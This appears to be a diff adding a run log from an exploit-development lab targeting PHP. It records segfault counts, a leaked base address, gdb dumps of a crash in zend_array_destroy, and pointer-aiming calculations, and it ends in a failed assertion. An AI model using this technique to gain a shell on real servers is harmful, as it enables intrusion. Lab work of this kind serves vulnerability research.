@@ -1,0 +1,27 @@
+=== oom137: proven-body phase-rotated arm ===
+md5 ok
+shaped segv=3
+base=0x7f9cbcbc2000
+pre x: NO_X
+m=12.96MB
+--- r1 ---
+r1-meas try0: http=200 segv+0 core=False x=NO_X
+r1-meas try1: http=-1 segv+1 core=True x=NO_X
+r1-meas gdb: rdi            0xe2c0de51e2c0df51  -2107440182331383983
+rip            0x7f9cbcf41e7b      0x7f9cbcf41e7b <zend_array_destroy+539> phase=7
+r1 analyze: rdi=0xe2c0de51e2c0df51 D=8 A=0x7f9cba3b9008
+aim: B=None OFF=None
+cannot aim
+--- r2 ---
+r2-meas try0: http=200 segv+0 core=False x=NO_X
+r2-meas try1: http=200 segv+0 core=False x=NO_X
+r2-meas try2: http=-1 segv+1 core=True x=NO_X
+r2-meas gdb: rdi            0xe2c0de51e2c0df51  -2107440182331383983
+rip            0x7f9cbcf41e7b      0x7f9cbcf41e7b <zend_array_destroy+539> phase=7
+r2 analyze: rdi=0xe2c0de51e2c0df51 D=8 A=0x7f9cba5b9008
+aim: B=0x7f9cba5b9108 OFF=256
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom137.py", line 283, in <module>
+    assert r is not None, "no rotation satisfies slice"
+           ^^^^^^^^^^^^^
+AssertionError: no rotation satisfies slice
